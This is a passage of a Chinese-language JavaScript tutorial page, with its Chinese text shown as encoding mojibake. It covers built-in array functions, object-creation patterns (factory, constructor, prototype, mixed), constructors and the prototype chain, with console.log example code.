</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br></div></div><h3 id="ç³»ç»Ÿå‡½æ•°-å†…ç½®å‡½æ•°" tabindex="-1"> ç³»ç»Ÿå‡½æ•°(å†…ç½®å‡½æ•°)</h3>
<h4 id="å¸¸è§„å‡½æ•°" tabindex="-1"> å¸¸è§„å‡½æ•°</h4>
<p><img src="@source/assets/cs-note/preface/basic/regular--function.png" alt="" loading="lazy"></p>
<h4 id="æ•°ç»„å‡½æ•°" tabindex="-1"> æ•°ç»„å‡½æ•°</h4>
<p><img src="@source/assets/cs-note/preface/basic/array-function.png" alt="" loading="lazy"></p>
<p><strong>æ•°ç»„å¸¸ç”¨æ“ä½œ</strong></p>
<ul>
<li>æ•°ç»„å£°æ˜
<ul>
<li>var arr=new Array();//å£°æ˜ä¸€ä¸ªç©ºæ•°ç»„å¯¹è±¡</li>
<li>var arr=new Array(length)//å£°æ˜ä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„æ•°ç»„</li>
<li>var arr=[å…ƒç´ ]//å£°æ˜æ•°ç»„(æœ€å¸¸ç”¨);jsä¸­çš„æ•°ç»„å£°æ˜ä¸ç”¨æŒ‡å®šé•¿åº¦ï¼Œjsçš„æ•°ç»„é•¿åº¦æ˜¯ä¸å›ºå®šçš„ï¼Œä¼šéšç€å…ƒç´ çš„æ•°é‡æ”¹å˜è€Œæ”¹å˜ã€‚</li>
</ul>
</li>
<li>æ•°ç»„çš„èµ‹å€¼å’Œå–å€¼
<ul>
<li>æ•°ç»„å¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„æ•°æ®ï¼šæ•°ç»„å[è§’æ ‡]=å€¼;//è§’æ ‡å¯ä»¥æ˜¯ä»»æ„çš„æ­£æ•´æ•°æˆ–è€…æ˜¯0</li>
<li>æ•°ç»„çš„å–å‡ºï¼šæ•°ç»„å[è§’æ ‡]//è¿”å›å½“å‰è§’æ ‡å¯¹åº”å­˜å‚¨çš„å€¼ï¼›å¦‚æœè§’æ ‡ä¸å­˜åœ¨ï¼Œè¿”å›undefined;</li>
</ul>
</li>
<li>æ•°ç»„ç‰¹ç‚¹
<ul>
<li>jsä¸­çš„æ•°ç»„å¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„æ•°æ®ã€‚</li>
<li>jsçš„æ•°ç»„å¯ä»¥é€šè¿‡lengthå±æ€§åŠ¨æ€çš„æ”¹å˜é•¿åº¦ã€‚å¯ä»¥å¢åŠ ï¼Œä¹Ÿå¯ä»¥ç¼©çŸ­ã€‚</li>
<li>æ³¨æ„ï¼š
<ul>
<li>å¦‚æœæ˜¯å¢åŠ ï¼Œåˆ™ä½¿ç”¨é€—å·è¿›è¡Œå ä½</li>
<li>å¦‚æœæ˜¯ç¼©å‡åˆ™ä»åå¾€å‰å‡å°‘å­˜å‚¨çš„æ•°æ®ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>æ•°ç»„çš„lengthå±æ€§
<ul>
<li>ä½œç”¨1ï¼šæ•°ç»„å.length          //è¿”å›å½“å‰æ•°ç»„çš„é•¿åº¦ã€‚</li>
<li>ä½œç”¨2ï¼šæ•°ç»„å.length=æ–°çš„å€¼   //åŠ¨æ€çš„æ”¹å˜æ•°ç»„çš„é•¿åº¦</li>
<li>æ³¨æ„ï¼šlength&gt;åŸæœ‰é•¿åº¦ï¼Œåˆ™ä½¿ç”¨ç©ºè¿›è¡Œå¡«å……ã€‚length&lt;åŸæœ‰é•¿åº¦ï¼Œåˆ™ä»åé¢è¿›è¡Œæˆªå–ï¼Œæœ€åçš„æ•°æ®ä¼šè¢«åˆ é™¤ã€‚</li>
</ul>
</li>
<li>æ•°ç»„çš„éå†
<ul>
<li>æ™®é€šforå¾ªç¯ï¼š for(var i=0;i &lt; arr.length; i++)</li>
<li>for-in: for(var i in arr)</li>
</ul>
</li>
</ul>
<h4 id="æ—¥æœŸå‡½æ•°" tabindex="-1"> æ—¥æœŸå‡½æ•°</h4>
<p><img src="@source/assets/cs-note/preface/basic/date-function.png" alt="" loading="lazy"></p>
<h4 id="æ•°å­¦å‡½æ•°" tabindex="-1"> æ•°å­¦å‡½æ•°</h4>
<p><img src="@source/assets/cs-note/preface/basic/math-function.png" alt="" loading="lazy"></p>
<h4 id="å­—ç¬¦ä¸²å‡½æ•°" tabindex="-1"> å­—ç¬¦ä¸²å‡½æ•°</h4>
<p><img src="@source/assets/cs-note/preface/basic/string-function.png" alt="" loading="lazy"></p>
<h2 id="é¢å‘å¯¹è±¡" tabindex="-1"> é¢å‘å¯¹è±¡</h2>
<p>jsæ˜¯åŸºäº<strong>åŸå‹</strong>ï¼ŒåŸºäºé¢å‘å¯¹è±¡ç¼–ç¨‹ä¹Ÿå³<strong>OOP</strong>(Object Oriented Programming)ï¼Œå®ƒæ²¡æœ‰ç±»çš„æ¦‚å¿µï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨<strong>å¯¹è±¡</strong>æ¥ç¼–ç¨‹</p>
<h3 id="åˆ›å»ºå¯¹è±¡" tabindex="-1"> åˆ›å»ºå¯¹è±¡</h3>
<ol>
<li>
<p>åˆ›å»ºObjectå®ä¾‹å’Œå¯¹è±¡å­—é¢é‡</p>
<ul>
<li>ç¼ºç‚¹ï¼šé‡å¤å®ä¾‹åŒ–å¯¹è±¡æ—¶ä»£ç å†—ä½™é«˜</li>
</ul>
</li>
<li>
<p>å·¥å‚æ¨¡å¼</p>
<ul>
<li>ä¼˜ç‚¹ï¼šè§£å†³é‡å¤å®ä¾‹åŒ–å¯¹è±¡çš„é—®é¢˜</li>
<li>ç¼ºç‚¹ï¼šæ— æ³•è¯†åˆ«å¯¹è±¡çš„ç±»å‹ï¼Œå› ä¸ºæ‰€æœ‰çš„å®ä¾‹æŒ‡å‘ä¸€ä¸ªåŸå‹(Object)</li>
</ul>
</li>
<li>
<p>æ„é€ å‡½æ•°æ¨¡å¼</p>
<ul>
<li>ä¼˜ç‚¹ï¼šå®ä¾‹å¯ä»¥è¯†åˆ«ä¸ºä¸€ä¸ªç‰¹å®šçš„ç±»å‹ï¼Œè§£å†³å·¥å‚æ¨¡å¼çš„ç¼ºç‚¹</li>
<li>ç¼ºç‚¹ï¼šå¤šä¸ªå®ä¾‹é‡å¤åˆ›å»ºæ–¹æ³•ï¼Œæ— æ³•å…±äº«</li>
</ul>
</li>
<li>
<p>åŸå‹æ¨¡å¼</p>
<ul>
<li>ä¼˜ç‚¹ï¼šæ–¹æ³•ä¸ä¼šè¢«é‡å¤åˆ›å»ºï¼Œè§£å†³äº†æ„é€ å‡½æ•°æ¨¡å¼çš„ç¼ºç‚¹</li>
<li>ç¼ºç‚¹ï¼šæ‰€æœ‰å®ä¾‹å…±äº«å®ƒçš„å±æ€§å’Œæ–¹æ³•ï¼Œä¸èƒ½ä¼ å‚å’Œåˆå§‹åŒ–å±æ€§å€¼</li>
</ul>
</li>
<li>
<p>æ··åˆæ¨¡å¼(3+4)æ¨è</p>
<ul>
<li>ä¼˜ç‚¹ï¼šæ„é€ å‡½æ•°å…±äº«å®ä¾‹å±æ€§ï¼ŒåŸå‹å…±äº«æ–¹æ³•å’Œæƒ³è¦å…±äº«çš„å±æ€§ï¼Œå¯ä¼ é€’å‚æ•°ï¼Œåˆå§‹åŒ–å±æ€§å€¼</li>
<li>ç¼ºç‚¹ï¼šåŸºæœ¬æ²¡æœ‰</li>
</ul>
</li>
</ol>
<div><pre><code>window<span>.</span><span>onload</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>// 1. åˆ›å»ºObjectå®ä¾‹</span>
    <span>let</span> Person <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>
    Person<span>.</span>name <span>=</span> <span>"å¼ ä¸‰"</span><span>;</span>
    Person<span>.</span>age <span>=</span> <span>"18"</span><span>;</span>
    Person<span>.</span><span>showInfo</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"äº†"</span><span>)</span><span>;</span>
    <span>}</span>
    Person<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>

    <span>// 2. å¯¹è±¡å­—é¢é‡</span>
    <span>let</span> Student <span>=</span> <span>{</span>
        <span>name</span> <span>:</span> <span>"å¼ ä¸‰"</span><span>,</span>
        <span>age</span> <span>:</span> <span>"18"</span><span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"äº†"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    Student<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>


    <span>// 3. å·¥å‚æ¨¡å¼</span>
    <span>function</span> <span>createObjFactory</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>const</span> obj <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>
        obj<span>.</span>name <span>=</span> name<span>;</span>
        obj<span>.</span>age <span>=</span> age<span>;</span>
        obj<span>.</span><span>showInfo</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"äº†"</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> obj<span>;</span>
    <span>}</span>
    <span>let</span> obj <span>=</span> <span>createObjFactory</span><span>(</span><span>"å¼ ä¸‰"</span><span>,</span> <span>17</span><span>)</span><span>;</span>
    obj<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>
    <span>// ç¼ºç‚¹éªŒè¯</span>
    console<span>.</span><span>log</span><span>(</span>obj <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>obj <span>instanceof</span> <span>createObjFactory</span><span>)</span><span>;</span> <span>// false</span>


    <span>// 4. æ„é€ å‡½æ•°æ¨¡å¼</span>
    <span>function</span> <span>Teacher</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
        <span>this</span><span>.</span><span>showInfo</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"äº†"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
    <span>let</span> tea1 <span>=</span> <span>new</span> <span>Teacher</span><span>(</span><span>"å¼ ä¸‰"</span><span>,</span> <span>28</span><span>)</span><span>;</span>
    <span>let</span> tea2 <span>=</span> <span>new</span> <span>Teacher</span><span>(</span><span>"æå››"</span><span>,</span> <span>10</span><span>)</span><span>;</span>
    <span>// ä¼˜ç‚¹éªŒè¯</span>
    console<span>.</span><span>log</span><span>(</span>tea1 <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>tea1 <span>instanceof</span> <span>Teacher</span><span>)</span><span>;</span> <span>// true</span>
    <span>// ç¼ºç‚¹éªŒè¯</span>
    console<span>.</span><span>log</span><span>(</span>tea1<span>.</span>showInfo <span>==</span> tea2<span>.</span>showInfo<span>)</span><span>;</span> <span>// false</span>
    

    <span>// 5. åŸå‹æ¨¡å¼</span>
    <span>function</span> <span>Worker</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>
    <span>Worker</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span> <span>:</span> Worker<span>,</span>
        <span>name</span> <span>:</span> <span>"å¼ ä¸‰"</span><span>,</span>
        <span>age</span> <span>:</span> <span>18</span><span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"äº†"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>let</span> wor1 <span>=</span> <span>new</span> <span>Worker</span><span>(</span><span>)</span><span>;</span>
    <span>let</span> wor2 <span>=</span> <span>new</span> <span>Worker</span><span>(</span><span>)</span><span>;</span>
    <span>// ä¼˜ç‚¹éªŒè¯</span>
    console<span>.</span><span>log</span><span>(</span>wor1<span>.</span>showInfo <span>==</span> wor2<span>.</span>showInfo<span>)</span><span>;</span> <span>// true</span>
    <span>// ç¼ºç‚¹éªŒè¯</span>
    console<span>.</span><span>log</span><span>(</span>wor1<span>.</span>name <span>==</span> wor2<span>.</span>name<span>)</span><span>;</span> <span>// true</span>
   
    
    <span>// 6. æ··åˆæ¨¡å¼(æ„é€ å‡½æ•°æ¨¡å¼å’ŒåŸå‹æ¨¡å¼)</span>
    <span>function</span> <span>People</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>
    <span>People</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span> <span>:</span> People<span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"äº†"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>let</span> p <span>=</span> <span>new</span> <span>People</span><span>(</span><span>"ç‹äº”"</span><span>,</span> <span>50</span><span>)</span><span>;</span>
    <span>let</span> p2 <span>=</span> <span>new</span> <span>People</span><span>(</span><span>"æå››"</span><span>,</span> <span>20</span><span>)</span><span>;</span>
    <span>// ä¼˜ç‚¹éªŒè¯</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>showInfo <span>==</span> p2<span>.</span>showInfo<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>name <span>==</span> p2<span>.</span>name<span>)</span><span>;</span> <span>// false</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br></div></div><h3 id="æ„é€ å‡½æ•°" tabindex="-1"> æ„é€ å‡½æ•°</h3>
<p>é€šè¿‡  new å‡½æ•°åæ¥å®ä¾‹åŒ–å¯¹è±¡çš„å‡½æ•°å«æ„é€ å‡½æ•°ã€‚ä»»ä½•çš„å‡½æ•°éƒ½å¯ä»¥ä½œä¸ºæ„é€ å‡½æ•°å­˜åœ¨ã€‚ä¹‹æ‰€ä»¥æœ‰æ„é€ å‡½æ•°ä¸æ™®é€šå‡½æ•°ä¹‹åˆ†ï¼Œä¸»è¦ä»åŠŸèƒ½ä¸Šè¿›è¡ŒåŒºåˆ«çš„ï¼Œæ„é€ å‡½æ•°çš„ä¸»è¦ åŠŸèƒ½ä¸º åˆå§‹åŒ–å¯¹è±¡ï¼Œç‰¹ç‚¹æ˜¯å’Œnew ä¸€èµ·ä½¿ç”¨ã€‚newå°±æ˜¯åœ¨åˆ›å»ºå¯¹è±¡ï¼Œä»æ— åˆ°æœ‰ï¼Œæ„é€ å‡½æ•°å°±æ˜¯åœ¨ä¸ºåˆå§‹åŒ–çš„å¯¹è±¡æ·»åŠ å±æ€§å’Œæ–¹æ³•ã€‚æ„é€ å‡½æ•°å®šä¹‰æ—¶é¦–å­—æ¯å¤§å†™ï¼ˆè§„èŒƒï¼‰ã€‚</p>
<p><strong>å¸¸ç”¨çš„æ„é€ å‡½æ•°</strong></p>
<ol>
<li>var arr = [];    ä¸º      var arr = new Array();      çš„è¯­æ³•ç³–</li>
<li>var obj = {}     ä¸º      var obj = new Object();     çš„è¯­æ³•ç³–</li>
<li>var  date = new Date();</li>
<li>...</li>
</ol>
<h3 id="åŸå‹å’ŒåŸå‹é“¾" tabindex="-1"> åŸå‹å’ŒåŸå‹é“¾</h3>
<p><strong>åŸå‹å¯¹è±¡</strong></p>
<ol>
<li>å‡½æ•°å¯¹è±¡éƒ½å…·æœ‰prototypeå±æ€§ï¼Œå®ƒæŒ‡å‘å‡½æ•°çš„åŸå‹å¯¹è±¡(æµè§ˆå™¨å†…å­˜åˆ›å»ºçš„å¯¹è±¡)ï¼ŒåŸå‹å¯¹è±¡éƒ½å…·æœ‰constructorå±æ€§ï¼Œå®ƒæŒ‡å‘prototypeå±æ€§æ‰€åœ¨çš„å‡½æ•°å¯¹è±¡(æ„é€ å‡½æ•°)ã€‚</li>
</ol>
<ul>
<li>å½“è°ƒç”¨æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªå®ä¾‹åï¼Œè¯¥å®ä¾‹ä¼šæœ‰ä¸€ä¸ªéšè—å±æ€§__proto__ ([[prototype]] )ï¼Œå®ƒæŒ‡å‘æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ã€‚</li>
<li>æ‰€æœ‰æ„é€ å‡½æ•°çš„prototypeéƒ½æ˜¯objectç±»å‹ï¼Œè€ŒFunctionçš„prototypeæ˜¯ä¸€ä¸ªç©ºå‡½æ•°ï¼Œæ‰€æœ‰å†…ç½®å‡½æ•°çš„_proto_æŒ‡å‘è¿™ä¸ªç©ºå‡½æ•°ã€‚</li>
<li>ä¸ºå®ä¾‹æ·»åŠ ä¸€ä¸ªå±æ€§æ—¶ï¼Œè¿™ä¸ªå±æ€§ä¼šå±è”½åŸå‹å¯¹è±¡ä¸­çš„åŒåå±æ€§(ä¸ä¼šé‡å†™)ï¼Œè‹¥æƒ³è®¿é—®åŸå‹å¯¹è±¡ä¸­çš„å±æ€§å€¼ï¼Œéœ€è¦ä½¿ç”¨deleteå°†è¿™ä¸ªåŒåå±æ€§åœ¨å®ä¾‹ä¸­å½»åº•åˆ é™¤</li>
<li>hasOwnProperty(&quot;å±æ€§å&quot;)å¯ä»¥æ£€æµ‹ä¸€ä¸ªå±æ€§æ˜¯å­˜åœ¨äºå®ä¾‹è¿˜æ˜¯åŸå‹å¯¹è±¡ä¸­ï¼Œtrueè¡¨ç¤ºå­˜åœ¨äºå®ä¾‹ä¸­ï¼Œfalseè¡¨ç¤ºå­˜åœ¨äºåŸå‹å¯¹è±¡ä¸­</li>
<li>inæ“ä½œç¬¦ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªå±æ€§æ˜¯å¦å­˜åœ¨äºè¿™ä¸ªå¯¹è±¡ä¸­(æ— è®ºæ˜¯å®ä¾‹è¿˜æ˜¯åŸå‹å¯¹è±¡)</li>
<li>å½“ä½¿ç”¨å¯¹è±¡å­—é¢é‡æ¥é‡å†™åŸå‹å¯¹è±¡æ—¶ï¼Œä¼šæ”¹å˜å…¶constructorå±æ€§ï¼Œä½¿å…¶æŒ‡å‘Objectæ„é€ å‡½æ•°ï¼Œè€Œä¸æ˜¯åŸæœ‰çš„å¯¹</li>
</ul>
<div><pre><code>window<span>.</span><span>onload</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>// å‡½æ•°å¯¹è±¡</span>
    <span>function</span> <span>People</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>
    <span>People</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span> <span>:</span> People<span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"ä»Šå¹´"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"å²äº†"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>let</span> p <span>=</span> <span>new</span> <span>People</span><span>(</span><span>)</span><span>;</span>
    p<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * 1. éªŒè¯ç¬¬ä¸€æ¡
     */</span>
    <span>// 1.1 æ„é€ å‡½æ•°çš„prototypeå±æ€§æŒ‡å‘åŸå‹å¯¹è±¡</span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype<span>)</span><span>;</span> <span>// {constructor: Æ’, showInfo: Æ’}</span>

    <span>// 1.2 åŸå‹å¯¹è±¡çš„constructorå±æ€§æŒ‡å‘æ„é€ å‡½æ•°</span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype<span>.</span>constructor<span>)</span><span>;</span> <span>// Æ’ People()</span>

    <span>/**
     * 2. éªŒè¯ç¬¬äºŒæ¡
     */</span>
    <span>// æ„é€ å‡½æ•°çš„å®ä¾‹æœ‰__proto__å±æ€§ï¼Œä»–æŒ‡å‘æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>__proto__ <span>===</span> <span>People</span><span>.</span>prototype<span>)</span><span>;</span> <span>// true</span>

    <span>/**
     * 3. éªŒè¯ç¬¬ä¸‰æ¡
     */</span>
    <span>// 3.1 æ‰€æœ‰æ„é€ å‡½æ•°çš„prototypeéƒ½æ˜¯object</span>
    <span>function</span> <span>A</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span><span>typeof</span> <span>People</span><span>.</span>prototype<span>)</span><span>;</span> <span>// object</span>
    console<span>.</span><span>log</span><span>(</span><span>typeof</span> <span>A</span><span>.</span>prototype<span>)</span><span>;</span> <span>// object</span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>A</span><span>.</span>prototype <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>

    <span>// 3.2 Functionçš„prototypeæ˜¯ä¸ªç©ºå‡½æ•°</span>
    console<span>.</span><span>log</span><span>(</span><span>Function</span><span>.</span>prototype<span>)</span><span>;</span> <span>// Æ’ ()</span>

    <span>// 3.3 æ‰€æœ‰å†…ç½®å‡½æ•°çš„__proto__å±æ€§éƒ½æŒ‡å‘è¿™ä¸ªç©ºå‡½æ•°</span>
    console<span>.</span><span>log</span><span>(</span>Array<span>.</span>__proto__<span>)</span><span>;</span> <span>// Æ’ ()</span>
    console<span>.</span><span>log</span><span>(</span>Date<span>.</span>__proto__<span>)</span><span>;</span> <span>// Æ’ ()</span>
    console<span>.</span><span>log</span><span>(</span>Math<span>.</span>__proto__<span>)</span><span>;</span> <span>// Æ’ ()</span>
    console<span>.</span><span>log</span><span>(</span>String<span>.</span>__proto__<span>)</span><span>;</span> <span>// Æ’ ()</span>

    <span>/**
     * 4. éªŒè¯ç¬¬å››æ¡
     */</span>
    <span>// 1. ä¸ºå®ä¾‹æ·»åŠ ä¸€ä¸ªå±æ€§æ—¶ä¼šå±è”½åŸå‹å¯¹è±¡çš„åŒåå±æ€§å€¼ï¼Œå› ä¸ºä¼šå…ˆåœ¨å®ä¾‹ä¸­æ‰¾ï¼Œæ‰¾ä¸åˆ°æ‰å»åŸå‹å¯¹è±¡ä¸­æ‰¾</span>
    <span>function</span> <span>Teacher</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>
    <span>Teacher</span><span>.</span>prototype<span>.</span>name <span>=</span> <span>"å¼ ä¸‰"</span><span>;</span>
    <span>let</span> tea <span>=</span> <span>new</span> <span>Teacher</span><span>(</span><span>"æå››"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>tea<span>.</span>name<span>)</span><span>;</span> <span>// æå››</span>
    console<span>.</span><span>log</span><span>(</span>tea<span>.</span>__proto__<span>.</span>name<span>)</span><span>;</span> <span>// å¼ ä¸‰</span>

    <span>// 2. ä½¿ç”¨deleteåˆ é™¤å®ä¾‹çš„åŒåå±æ€§å€¼</span>
    console<span>.</span><span>log</span><span>(</span>
        <span>delete</span> tea<span>.</span>name
    <span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>tea<span>.</span>name<span>)</span><span>;</span> <span>// å¼ ä¸‰</span>

    <span>/**
     * 5. éªŒè¯ç¬¬äº”æ¡
     */</span>
    <span>// æ£€æµ‹ä¸€ä¸ªå±æ€§åœ¨å®ä¾‹å¯¹è±¡ä¸­(true)è¿˜æ˜¯åŸå‹å¯¹è±¡ä¸­(false)</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span><span>hasOwnProperty</span><span>(</span>name<span>)</span><span>)</span><span>;</span> <span>// false</span>

    <span>/**
     * 6. éªŒè¯ç¬¬å…­æ¡
     */</span>
    <span>// åˆ¤æ–­å®ä¾‹å’ŒåŸå‹å¯¹è±¡æ˜¯å¦æœ‰æ­¤å±æ€§</span>
    console<span>.</span><span>log</span><span>(</span>name <span>in</span> p<span>)</span><span>;</span> <span>// false</span>

    <span>/**
     * 7. éªŒè¯ç¬¬ä¸ƒæ¡
     */</span>
    <span>//å½“ä½¿ç”¨å¯¹è±¡å­—é¢é‡æ¥é‡å†™åŸå‹å¯¹è±¡æ—¶ï¼Œä¼šæ”¹å˜å…¶constructorå±æ€§ï¼Œä½¿å…¶æŒ‡å‘Objectæ„é€ å‡½æ•°ï¼Œè€Œä¸æ˜¯åŸæœ‰çš„å¯¹è±¡</span>
    <span>function</span> <span>Worker</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>
    <span>Worker</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>// å¿…é¡»æ‰‹åŠ¨æŒ‡å‘</span>
        <span>constuctor</span> <span>:</span> Worker<span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            <span>alert</span><span>(</span><span>this</span><span>.</span>name<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>// æ²¡æœ‰æ‰‹åŠ¨æŒ‡å‘</span>
    console<span>.</span><span>log</span><span>(</span><span>Worker</span><span>.</span>prototype<span>)</span><span>;</span> <span>// {showInfo: Æ’}</span>
    <span>// æ‰‹åŠ¨æŒ‡å‘</span>
    console<span>.</span><span>log</span><span>(</span><span>Worker</span><span>.</span>prototype<span>)</span><span>;</span> <span>// {constuctor: Æ’, showInfo: Æ’}</span>
    
    <span>/**
     * 8. åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦åœ¨æ­¤å¯¹è±¡çš„åŸå‹é“¾ä¸­
     */</span>
    console<span>.</span><span>log</span><span>(</span><span>Object</span><span>.</span>prototype<span>.</span><span>isPrototypeOf</span><span>(</span>p<span>)</span><span>)</span><span>;</span> <span>// true </span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype<span>.</span><span>isPrototypeOf</span><span>(</span>p<span>)</span><span>)</span><span>;</span> <span>// true</span>
    
    <span>/**
     * 9. è¿”å›è¯¥å¯¹è±¡çš„åŸå‹
     */</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>__proto__ <span>===</span> Object<span>.</span><span>getPrototypeOf</span><span>(</span>p<span>)</span><span>)</span><span>;</span> <span>// true</span>
<span>}</span>
